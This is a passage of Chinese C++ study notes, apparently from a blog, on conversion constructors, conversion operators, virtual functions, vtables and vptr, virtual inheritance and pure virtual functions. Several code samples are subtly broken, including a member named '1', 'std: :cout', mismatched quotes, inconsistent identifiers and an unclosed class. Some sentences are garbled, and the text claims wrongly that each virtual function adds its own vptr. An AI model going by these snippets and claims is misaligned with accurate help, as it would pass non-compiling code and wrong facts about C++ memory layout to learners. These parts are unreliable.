title="转换构造函数"></a>转换构造函数</h4><p>转换构造函数可以用单个实参来调用，其<strong>定义从形参类型到该类类型的一个隐式转换</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Integral</span> &#123;</span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line"><span class="built_in">Integral</span>(<span class="type">int</span>=<span class="number">0</span>);<span class="comment">//转换构造函数</span></span><br><span class="line"><span class="keyword">private</span> :</span><br><span class="line"><span class="type">int</span> real;</span><br><span class="line">&#125;;</span><br><span class="line">Integral integ=<span class="number">1</span>; <span class="comment">//调用转换构造函数将1转换为Integral类的对象</span></span><br></pre></td></tr></table></figure><p>转换构造函数<strong>需满足以下条件之一</strong>:</p><ul><li>Integral类的定义和实现中给出了<strong>仅包括只有一个int类型参数的构造函数</strong>；</li><li>Integral 类的定义和实现中给出了包含<strong>一个int类型参数，且其他参数都有缺省值的构造函数</strong>；</li><li>Integral 类的定义和实现中虽然不包含int 类型参数，但包含一个非 int类型参数如float类型，此外没有其他参数或者其他参数都有缺省值，且int类型参数可隐式转换为float类型参数。</li></ul><p>可以通过将构造函数声明为explicit, 来禁止隐式转换。</p><h4 id="类型转换函数"><a href="#类型转换函数" class="headerlink" title="类型转换函数"></a>类型转换函数</h4><p>类型转换函数的作用是<strong>将一个类的对象转换成另一类型的数据</strong>，与转换构造函数作用相反。在类中，定义类型转换函数的一般格式为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Integral</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Integral</span>(<span class="type">int</span>=<span class="number">0</span>);  <span class="comment">//转换构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span></span>&#123;   <span class="comment">//类型转换函数，函数名为operator int，指明转换的目标类型为int</span></span><br><span class="line">        <span class="keyword">return</span> real;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> real;</span><br><span class="line">Integral integ=<span class="number">1</span>;   <span class="comment">//调用转换构造函数将int型的1转换为Integral类的对象</span></span><br><span class="line"><span class="type">int</span> i=integ;        <span class="comment">//调用类型转换函数将integ转换为int类型</span></span><br></pre></td></tr></table></figure><p>定义类型转换函数，需要注意以下几点:</p><ul><li>转换函数必须是成员函数，不能是友元形式;</li><li>转换函数不能指定返回类型，但在函数体内必须用return语句以传值方式返回一个目标类型的变量</li><li>转换函数不能有参数。</li></ul><p>非C++内建型别A和B，<strong>在以下几种情况下B能隐式转化为A</strong>。</p><ul><li><p>B公有继承自A，可以是间接继承的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class B:public A&#123;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>此时若有<code>A a; B b;</code>， 则<code>a=b;</code>合法。</p></li><li><p>B中有类型转换函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">A</span><span class="params">()</span></span>;   <span class="comment">// 类型转换函数，将B类对象强制转换为A类类型</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>此时若有<code>A a; B b;</code>， 则<code>a=b;</code>合法。</p></li><li><p>A实现了非explicit的参数为B (可以有其他带默认值的参数)的构造函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line"><span class="built_in">A</span>(<span class="type">const</span> B&amp;);    <span class="comment">// 转换构造函数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>此时若有<code>A a; B b;</code>， 则<code>a=b;</code>合法。</p></li></ul><h3 id="9-2-虚函数多态"><a href="#9-2-虚函数多态" class="headerlink" title="9.2 虚函数多态"></a>9.2 虚函数多态</h3><p>通俗地说，多态性是指<strong>同一个操作作用于不同的对象就会产生不同的响应</strong>；</p><p>多态性分为<strong>静态多态性</strong>和<strong>动态多态性</strong>：</p><ul><li>静态多态性：函数重载和运算符重载</li><li>动态多态性：虛函数</li></ul><h4 id="静态联编与动态联编"><a href="#静态联编与动态联编" class="headerlink" title="静态联编与动态联编"></a>静态联编与动态联编</h4><p>以函数重载为例，C++编译器根据传递给函数的参数和函数名决定具体要使用哪一个函数，称为<strong>联编</strong>或绑定(binding)。</p><p>编译器可以在编译过程中完成这种联编，<strong>在编译过程中进行的联编叫静态联编</strong>(static binding)或早期联编(early binding)。<br>在一些场合下，编译器无法在编译过程中完成联编，必须<strong>在程序运行时</strong>完成选择，因此编译器必须提供一套称为“动态联编”(dynamic binding)的机制，也叫晚期联编(late binding)，<strong>C++通过虚函数来实现动态联编</strong>。</p><p>如果一个基类的成员函数定义为虚函数，那么，它在所有派生类中也保持为虚函数；即使在派生类中省略了virtual 关键字，也仍然是虚函数。</p><p>派生类中可根据需要对虚函数进行重定义，重定义的格式有一定的要求：</p><ul><li>与基类的虚函数有相同的参数个数</li><li>与基类的虚函数有相同的参数类型</li><li>与基类的虚函数有相同的返回类型；或者都返回指针(或引用)，并且派生类虚函数所返回的指针(或引用)类型是基类中被替换的虚函数所返回的指针(或引用)类型的子类型(派生类型)。</li></ul><h5 id="虚函数的访问"><a href="#虚函数的访问" class="headerlink" title="虚函数的访问"></a>虚函数的访问</h5><p>虚函数可以通过对象名来调用，此时编译器采用的是静态联编。通过对象名访问虚函数时，调用哪个类的函数取决于定义对象名的类型。</p><ul><li>&#x3D;&#x3D;使用指针访问<strong>非虚函数</strong>时，编译器根据<strong>指针本身的类型决定</strong>要调用哪个函数&#x3D;&#x3D;，而不是根据指针指向的对象类型；</li><li>&#x3D;&#x3D;使用指针访问<strong>虚函数</strong>时，编译器根据<strong>指针所指对象的类型决定</strong>要调用哪个函数<strong>（动态联编）</strong>&#x3D;&#x3D;，而与指针本身的类型无关。</li></ul><p>因此这里<strong>虚函数的作用</strong>就是使得指向基类的指针在操作它的多态类对象时，是根据不同的类对象来调用相应的函数，而不是调用基类的函数。</p><p>使用引用访问虚函数，与使用指针访问虚函数类似，不同的是，引用一经声明后，引用变量本身无论如何改变，其调用的函数就不会再改变，始终指向其开始定义时的函数。因此在使用上有一定限制，但这在一定程度上提高了代码的安全性。</p><p>总结如下，C++中的函数调用默认不使用动态绑定。要触发动态绑定，需满足两个条件：</p><p>第一，只有指定为虚函数的成员函数才能进行动态绑定，成员函数默认为非虚函数，非虚函数不进行动态绑定；</p><p>第二，必须通过基类类型的引用或指针进行函数调用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">base</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">disp</span><span class="params">()</span> </span>&#123;cout &lt;&lt; <span class="string">&quot;hel1o, base1&quot;</span>&lt;&lt; endl; &#125;   <span class="comment">// 虚函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">disp2</span><span class="params">()</span> </span>&#123;cout &lt;&lt; <span class="string">&quot;hello, base2&quot;</span> &lt;&lt; endl; &#125;         <span class="comment">// 默认为非虚函数</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">childl</span> :<span class="keyword">public</span> base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">disp</span><span class="params">()</span> </span>&#123;cout &lt;&lt; <span class="string">&quot;hello, child1&quot;</span> &lt;&lt; endl; &#125;    <span class="comment">// 覆盖基类的虚函数disp</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">disp2</span> <span class="params">()</span> </span>&#123;cout &lt;&lt; <span class="string">&quot;hello, child2&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">base * base=<span class="literal">NULL</span>;</span><br><span class="line">childl obj_child1;</span><br><span class="line">base = &amp;obj_childl;  <span class="comment">// 派生类地址给基类指针赋值，发生隐式转换</span></span><br><span class="line">base-&gt;<span class="built_in">disp</span>();        <span class="comment">// 通过指针访问虚函数，根据指针所指对象的类型决定调用的函数，base指向childl类类型</span></span><br><span class="line">base-&gt;<span class="built_in">disp2</span>() ;      <span class="comment">// 通过指针访问非虚函数，根据指针本身的类型决定调用的函数，base为base类类型</span></span><br></pre></td></tr></table></figure><p>上述代码的输出为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello, child1</span><br><span class="line">hello, base2</span><br></pre></td></tr></table></figure><p><u><strong>常见的不能声明为虚函数的有</strong></u>：</p><p>普通函数(非成员函数)、静态成员函数、构造函数、友元函数，而<strong>内联成员函数、赋值操作符重载函数即使声明为虚函数也无意义</strong>。</p><p>析构函数可以被声明为虚函数，因为销毁对象时需要识别对象类型。</p><ul><li><p><strong>构造函数</strong>不能为虚函数：</p><p>若基类的构造函数为虚函数，那么派生类的构造函数会覆盖基类的构造函数，使得基类无法构造。且虚函数旨在在不同类型的对象上产生不同动作，而构造函数运行时对象还未产生。</p></li><li><p><strong>普通函数</strong>不能为虚函数：</p><p>普通函数只能被重载，不能被覆盖，声明为虚函数没有意义。</p></li><li><p><strong>静态函数</strong>不能为虚函数：</p><p>静态函数属于类，而不是对象，所以没有动态绑定的需要。</p></li><li><p><strong>友元函数</strong>不能为虚函数：</p><p>C++不支持友元函数的继承</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Fun</span> <span class="params">(<span class="type">int</span> number=<span class="number">10</span>)</span> </span>&#123;</span><br><span class="line">std: :cout &lt;&lt; <span class="string">&quot;A::Fun with number”&lt;&lt; number&lt;&lt;endl;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">class B: public A&#123;</span></span><br><span class="line"><span class="string">public:</span></span><br><span class="line"><span class="string">virtual void Fun (int number=20) &#123;</span></span><br><span class="line"><span class="string">std::cout &lt;&lt; &quot;</span>B::Fun with number ”&lt;&lt; number&lt;&lt;endl ;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    B b;</span><br><span class="line">    A &amp;a=b;</span><br><span class="line">    a.<span class="built_in">Fun</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>上述代码输出为<code>B::Fun with number 10</code> 。由于A中的Fun函数为虚函数，所以<code>a.Fun()</code>会动态联编到a所引用的对象b的Fun函数上，因此输出<code>B::Fun with number 10</code>。之所以number变量为10，是因为缺省实参是编译时确定的，在动态联编之前。</p></blockquote><h5 id="构造函数和析构函数中的虚函数"><a href="#构造函数和析构函数中的虚函数" class="headerlink" title="构造函数和析构函数中的虚函数"></a>构造函数和析构函数中的虚函数</h5><p>构造派生类对象时，<strong>首先</strong>运行基类构造函数初始化对象的基类部分。在执行基类构造函数时，对象的派生类部分是未初始化的。实际上，此时对象还不是一个派生类对象。</p><p>撤销派生类对象时，<strong>首先</strong>撤销它的派生类部分，然后按照与构造顺序的逆序撤销它的基类部分。</p><p><em>在这两种情况下，运行构造函数或析构函数时，对象都是不完整的。为了适应这种不完整，编译器将对象的类型视为在构造或析构期间发生了变化。在基类构造函数或析构函数中，将派生类对象当作基类类型对象对待。</em></p><p><strong>如果在构造函数或析构函数中调用虚函数，则运行的是为构造函数或析构函数自身类型定义的版本（静态联编）。</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220701105151776.png" alt="image-20220701105151776"></p><blockquote><p>解析：构造函数不需要是虚函数，也不允许是虚函数，因为创建一个对象时我们总是要明确指定对象的类型，尽管我们可能通过实验室的基类的指针或引用去访问它但析构却不一定，我们往往通过基类的指针来销毁对象。这时候如果析构函数不是虚函数，就不能正确识别对象类型从而不能正确调用析构函数。</p></blockquote><h4 id="虚函数表指针（vptr）及虚基类表指针（bptr）"><a href="#虚函数表指针（vptr）及虚基类表指针（bptr）" class="headerlink" title="虚函数表指针（vptr）及虚基类表指针（bptr）"></a>虚函数表指针（vptr）及虚基类表指针（bptr）</h4><p>C+ +在布局以及存取时间上主要的额外负担是由virtual引起的，包括:</p><p>virtual function 机制：用以支持-一个有效率的“执行期绑定”;</p><p>virtual base class：用以实现多次出现在继承体系中的基类，有一个单一而被共享的实体。</p><h5 id="虚函数表指针"><a href="#虚函数表指针" class="headerlink" title="虚函数表指针"></a>虚函数表指针</h5><p>C++中数据成员可以分为静态和非静态，以及三种类成员函数：静态、非静态和虚函数。</p><p>其中，非static数据成员被配置于每一个对象之内，static 数据成员则被存放在所有的对象之外，通常被放置在程序的全局(静态)存储区内，故不会影响个别的对象大小。static 和非static函数也被放在所有的对象之外。virtual 函数则以两个步骤支持之：</p><ol><li><p><strong>每一个类产生出一堆指向virtual functions的指针，放在表格之中，这个表格被称为virtual table(vtbl)；</strong> </p></li><li><p><strong>每一个<u>对象</u>被添加了一个指针，指向相关的vitual table。</strong>通常这个指针被称为**vptr (虚函数表指针)**。vptr 的设定和重置都由每一个类的构造函数、析构函数和复制构造函数自动完成。（每个虚函数的存在会为类的内存空间增加一个虚函数表指针）</p></li></ol><h5 id="含静态变量、虚函数的类的空间计算"><a href="#含静态变量、虚函数的类的空间计算" class="headerlink" title="含静态变量、虚函数的类的空间计算"></a>含静态变量、虚函数的类的空间计算</h5><p>sizeof应用在类和结构的处理情况是相同的。但需要注意结构或者类中的<strong>静态成员不对结构或者类的大小产生影响</strong>，因为静态变量的存储位置与单个对象的地址无关。</p><p><strong>空类的大小为1个字节</strong>。<strong>含有虚函数的类会多出虚函数表指针的空间占用</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;&#125;;    <span class="comment">// 空类占1个字节</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>&#123;      <span class="comment">// 有一个虚函数，因此B中有指针vptr，占4个字节</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">B</span>() ;</span><br><span class="line"><span class="keyword">virtual</span> ~<span class="built_in">B</span>() ;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>&#123;      <span class="comment">// 大小为4、4（2对其为4）、4、64、4、4的和，为84</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(4)   <span class="comment">// 设置编译器按照4个字节对齐</span></span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">short</span> j;</span><br><span class="line">    <span class="type">float</span> k;</span><br><span class="line">    <span class="type">char</span> <span class="number">1</span>[<span class="number">64</span>] ;</span><br><span class="line">    <span class="type">long</span> m;</span><br><span class="line">    <span class="type">char</span> *p;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack()</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>&#123;      <span class="comment">// 大小为4、2、4、64、4、4的和，为82</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(1)   <span class="comment">// 设置编译器按照1个字节对齐</span></span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">short</span> j;</span><br><span class="line">    <span class="type">float</span> k;</span><br><span class="line">    <span class="type">char</span> <span class="number">1</span> [<span class="number">64</span>]; </span><br><span class="line">    <span class="type">long</span> m;</span><br><span class="line">    <span class="type">char</span> *p;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack()</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上述代码中，各类的sizeof结果为1、4、84、82。</p><h5 id="虚函数表的实现"><a href="#虚函数表的实现" class="headerlink" title="虚函数表的实现"></a>虚函数表的实现</h5><p>使用指针访问<strong>虚函数</strong>时，编译器根据<strong>指针所指对象的类型决定</strong>要调用哪个函数（动态联编）。比如有基类A及其派生类B，基类A中有一个虚函数fun()，派生类也有一个函数fun()进行覆盖。若有一B类对象b，对于语句<code>A* a=&amp;b; a-&gt;fun();</code>，其运行时会发生动态联编，调用的fun()为指针所指的B类对象b的函数，而不是A类。</p><p>但是此过程中，父类指针a是如何根据虚函数表找到子类B的虚函数的?</p><p><strong>首先父类指针a所指空间为对象b，其中存在虚函数表指针vptr，通过其可以找到对象b的虚函数表，进而找到类B的函数fun()。</strong></p><p>例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">a</span><span class="params">()</span> </span>&#123;cout &lt;&lt; <span class="string">&quot;a() in A&quot;</span>&lt;&lt; endl; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">b</span><span class="params">()</span> </span>&#123;cout &lt;&lt; <span class="string">&quot;b() in A&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">c</span><span class="params">()</span> </span>&#123;cout &lt;&lt; <span class="string">&quot;c() in A&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">d</span><span class="params">()</span> </span>&#123;cout &lt;&lt; <span class="string">&quot;d() in A&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">a</span><span class="params">()</span> </span>&#123;cout &lt;&lt; <span class="string">&quot;a() in B&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">b</span><span class="params">()</span> </span>&#123;cout&lt;&lt; <span class="string">&quot;b() in B&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> : <span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">a</span><span class="params">()</span> </span>&#123;cout &lt;&lt; <span class="string">&quot;a() in C&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">b</span><span class="params">()</span> </span>&#123;cout &lt;&lt; <span class="string">&quot;b() in C&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span> : <span class="keyword">public</span> B, <span class="keyword">public</span> C&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">a</span><span class="params">()</span> </span>&#123;cout &lt;&lt; <span class="string">&quot;a() in D&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">d</span><span class="params">()</span> </span>&#123;cout &lt;&lt; <span class="string">&quot;d() in D&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上述代码中，类A的对象的虚函数表如下，每个各自记录一个函数的<strong>地址</strong>：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220701150726541.png" alt="image-20220701150726541"></p><p>由于B、C继承自A，所以其定义的a()、b()也为虚函数。类B、C的对象的虚函数表如下：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220701150850252.png" alt="image-20220701150850252"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220701150927278.png" alt="image-20220701150927278"></p><p>可见单基继承时，仅有一个vptr。派生类的函数覆盖了基类的同名函数，虚函数表中相应位置也替换为了新函数的地址。通过对象的虚函数表指针vptr就可以找到所属类的函数了。</p><p>类D的对象的虚函数表如下：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220701151349316.png" alt="image-20220701151349316"></p><p>可见，多基继承时，有几个基类就有几个vptr。D类中的函数a与d覆盖了B类中的同名函数，故虚函数表中对应位置替换为新函数的地址。D类中的函数a与d覆盖了C类中的同名函数，故虚函数表中对应位置替换为新函数的地址。</p><h5 id="虚基类表指针"><a href="#虚基类表指针" class="headerlink" title="虚基类表指针"></a>虚基类表指针</h5><p>继承也可以指定为虚拟（virtual）。在虚拟继承的情况下，基类不管在继承串链中被派生多少次，永远只会存在一个实体。</p><p>在虚拟继承基类的子类中，子类会增加某种形式的指针，或者指向虚基类子对象，或者指向一个相关的表格；表格中存放的不是虚基类子对象的地址，就是其偏移量。<strong>此指针被称为bptr</strong>，如下图所示。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220701204518663.png" alt="image-20220701204518663"></p><p><strong>注意：在同时存在vptr与bptr时，某些编译器会将其进行优化，合并为一个指针。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>&#123;&#125;;                    <span class="comment">// 空类，占1个字节</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Y</span>:<span class="keyword">public</span> <span class="keyword">virtual</span> X&#123;&#125;;   <span class="comment">// 虚拟继承，需要虚基表指针bptr的空间，4个字节，继承自X的1字节被优化为0</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Z</span>:<span class="keyword">public</span> <span class="keyword">virtual</span> X&#123;&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:<span class="keyword">public</span> Y, <span class="keyword">public</span> Z&#123;&#125;; <span class="comment">// 继承Y，占4个字节；继承Z，占4个字节；总共占8个字节</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;sizeof(X) : &quot;</span>&lt;&lt; <span class="built_in">sizeof</span>(X) &lt;&lt; endl;</span><br><span class="line">    cout.&lt;&lt; <span class="string">&quot;sizeof(Y) : &quot;</span>&lt;&lt; <span class="built_in">sizeof</span>(Y) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;sizeof(Z) : &quot;</span>&lt;&lt; <span class="built_in">sizeof</span>(Z) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;sizeof(A) : &quot;</span>&lt;&lt; <span class="built_in">sizeof</span>(A) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="虚拟继承时构造函数的书写"><a href="#虚拟继承时构造函数的书写" class="headerlink" title="虚拟继承时构造函数的书写"></a>虚拟继承时构造函数的书写</h4><p>对普通的多层继承而言，构造函数的调用是嵌套的，如由C1类派生C2类，C2 类又派生C3类时，则各个构造函数有如下形式:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">C2</span> (总参数表) :<span class="built_in">C1</span> (参数表)</span><br><span class="line"><span class="built_in">C3</span> (总参数表) :<span class="built_in">C2</span> (参数表)</span><br></pre></td></tr></table></figure><p>而对虚基派生来说，如果按照上述规则，若A类虚拟派生B类、C类，D类继承B类、C类，则各个构造函数有如下形式:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">B</span>(总参数表) :<span class="built_in">A</span>(参数表)</span><br><span class="line"><span class="built_in">C</span>(总参数表) :<span class="built_in">A</span>(参数表)</span><br><span class="line"><span class="built_in">D</span>(总参数表) :<span class="built_in">B</span>(参数表)，<span class="built_in">C</span>(参数表)，<span class="built_in">A</span>(参数表)</span><br></pre></td></tr></table></figure><p>​根据虚基派生的性质，类D中只有一份虚基类A的拷贝，因此A类的构造函数在D类中只能被调用一次。所以，从A类直接虚拟派生(B和C)和间接派生(D)的类中，其<strong>构造函数的初始化列表中都要列出对虚基类A构造函数的调用</strong>。这种机制保证了<strong>不管有多少层继承，虚基类的构造函数必须且只能被调用一次</strong>。</p><p><strong>若在初始化列表中没有显式调用虚基类的构造函数，则将调用虚基类的默认构造函数，若虚基类没有定义默认构造函数，则编译出错。</strong></p><h4 id="纯虚函数"><a href="#纯虚函数" class="headerlink" title="纯虚函数"></a>纯虚函数</h4><p>纯虚函数是一一种特殊的虚函数，它的一般格式如下:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> &lt;类名&gt;&#123;</span><br><span class="line"><span class="keyword">virtual</span> &lt;类型&gt; &lt;函数名&gt; (&lt;参数表&gt;)=<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在许多情况下，<strong>在基类中不对虚函数给出有意义的实现，而把它声明为纯虚函数，它的实现留给该基类的派生类去做</strong>。这就是纯虚函数的作用。纯虚函数可以让类先具有一个操作名称，而没有操作内容，让派生类在继承时再去具体地给出定义。**<u>凡是含有纯虚函数的类称为抽象类</u>**。这种类不能声明对象，只是作为基类为派生类服务。除非在派生类中完全实现基类中所有的纯虚函数，否则，派生类也是抽象类，不能实例化对象。</p><p><strong>只定义了protected 型构造函数的类也是抽象类。</strong>对一个类来说，如果只定义了protected 型的构造函数而没有提供public构造函数，无论是在外部还是在派生类中都不能创建该类的对象，但可以由其派生出新的类，这种能派生新类，却不能创建自己对象的类是另一种形式的抽象类。</p><p><strong>抽象类不能声明对象，但是可以作为指针或者引用类型使用。</strong></p><h3 id="9-3-动态运行时类型识别与显式转换"><a href="#9-3-动态运行时类型识别与显式转换" class="headerlink" title="9.3 动态运行时类型识别与显式转换"></a>9.3 动态运行时类型识别与显式转换</h3><h4 id="typeid"><a href="#typeid" class="headerlink" 